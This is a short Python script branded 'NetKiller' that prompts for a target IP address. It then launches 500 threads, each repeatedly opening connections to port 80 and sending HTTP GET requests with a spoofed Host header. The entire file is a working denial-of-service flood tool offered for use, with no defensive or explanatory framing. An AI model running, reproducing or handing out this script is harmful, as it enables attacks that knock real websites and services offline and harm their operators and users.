import socket
import threading
print('\033[0;34m'"    _   __     __ \033[0;32m __ __ _ ____")
print('\033[0;34m'"   / | / /__  / /_ \033[0;32m/ //_/(_) / /__  _____")
print('\033[0;34m'"  /  |/ / _ \/ __ \033[0;32m/ ,<  / / / / _ \/ ___/")
print('\033[0;34m'" / /|  /  __/ /_ \033[0;32m/ /| |/ / / /  __/ /")
print('\033[0;34m'"/_/ |_/\___/\__ \033[0;32m/_/ |_/_/_/_/\___/_/     ")

print('\033[32m'"author=@Alexandervasiliu")
number = input('\033[0;31m'"insert ip address=  ")
address = input('\033[0;31m'"insert your ip address=  ")

target = number
fake_ip = address
port = 80



attack_num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()